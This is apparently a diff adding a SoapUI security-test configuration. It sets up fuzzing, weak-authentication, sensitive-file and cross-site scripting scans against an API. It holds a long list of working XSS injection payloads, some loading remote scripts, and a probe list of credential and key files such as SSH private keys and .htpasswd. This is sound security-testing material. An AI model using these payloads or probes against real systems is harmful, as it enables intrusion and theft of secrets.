+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="JsonFuzzingScan" name="JSON Fuzzing Scan" id="190637af-a75c-4147-8400-6584847d27a5" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:JsonFuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="608336d4-2ea0-4a09-a8a5-0e0c5d5f2be2" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="579f9cef-a899-4754-8ffb-76d141f02cb2" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="428d67e8-b443-4a7a-accd-5b742dc852b4" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="d3a92d23-415c-48e8-90e6-e95d1adb6904" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="WeakPassword" id="02e6c67e-eb93-408a-882f-0b206260d005" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="1c6d42b9-02c0-42b2-a52e-f60856d3e2dd" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:testStepSecurityTest>
+    <con:testStepId>022d6c41-8d52-4cab-9f55-eb49727b9d52</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="a378edd7-6034-4119-a15c-5914adeb00a0" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="cc6db502-cbfd-4707-a63e-61292bb76000" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="e64886de-14d1-49cb-ba05-63bf8cbfd888" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="bda5cad7-c6d1-4ce2-94e7-55b451b8157a" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="c03b6082-5880-4316-9165-61ddc352e626" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="72e0025f-799f-4fa1-b60f-89ae2f0c6560" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="d135e08b-647a-4eca-adf8-1bfd2f9de30c" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="d49ab655-0270-4724-9aa4-fcfa138e2d4e" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="6d3c2f82-e2c0-404e-be50-02e30624f5f5" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
